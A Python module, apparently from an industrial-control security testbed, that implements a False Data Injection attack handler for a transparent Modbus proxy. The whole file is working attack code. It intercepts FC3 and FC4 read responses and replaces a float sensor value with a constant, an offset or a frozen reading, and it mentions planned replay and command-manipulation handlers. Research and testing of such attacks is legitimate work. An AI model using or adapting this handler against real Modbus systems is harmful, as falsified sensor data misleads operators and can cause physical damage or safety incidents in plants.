"""Attack handlers: the frame-rewriting logic the transparent proxy applies.

Phase 2 ships False Data Injection on a float sensor register. The handler is
deliberately small and testable; replay and command manipulation (phase 3) are
further handlers over the same proxy.
"""

from __future__ import annotations

import struct

from ..protocols import modbus as mb
from .proxy import FC_READ_HOLDING, FC_READ_INPUT, Handler


class FDIHandler(Handler):
    """Falsify a float sensor value inside Modbus read responses.

    The sensor occupies two 16-bit registers at ``address`` (IEEE-754 float32,
    high word first), served as input registers (FC4, ``reg_type='A'``) or
    holding registers (FC3, ``reg_type='H'``). Modes:
      * ``const``  — report ``value`` regardless of the true reading;
      * ``offset`` — report true + ``value``;
      * ``freeze`` — report the first true value seen while active.
    """

    def __init__(self, func: int, address: int, mode: str, value: float = 0.0):
        super().__init__()
        assert func in (FC_READ_INPUT, FC_READ_HOLDING)
        assert mode in ("const", "offset", "freeze")
        self.func, self.address, self.mode, self.value = func, address, mode, value
        self._frozen: float | None = None

    def on_request(self, txn, unit, func, pdu: bytes) -> bytes:
        # remember the register window this transaction asked for
        if func in (FC_READ_INPUT, FC_READ_HOLDING) and len(pdu) >= 5:
            start, qty = struct.unpack(">HH", pdu[1:5])
            self.state[txn] = (func, start, qty)
        return pdu

    def on_response(self, txn, unit, func, pdu: bytes) -> bytes:
        if not self.enabled or func != self.func:
            return pdu
        req = self.state.get(txn)
        if not req:
            return pdu
        _, start, qty = req
        a = self.address
        if not (start <= a and a + 1 <= start + qty - 1):  # both words in window
            return pdu
        if len(pdu) < 2:
            return pdu
        bc = pdu[1]
        regs = bytearray(pdu[2:2 + bc])
        off = (a - start) * 2
        if off + 4 > len(regs):
            return pdu
        true_val = mb.regs_to_float(list(struct.unpack(">HH", bytes(regs[off:off + 4]))))
        if self.mode == "const":
            new = self.value
        elif self.mode == "offset":
            new = true_val + self.value
        else:  # freeze
            if self._frozen is None:
                self._frozen = true_val
            new = self._frozen
        hi, lo = mb.float_to_regs(new)
        regs[off:off + 4] = struct.pack(">HH", hi, lo)
        self.hits += 1
        return bytes(pdu[:2]) + bytes(regs)

    def reset(self):
        self._frozen = None
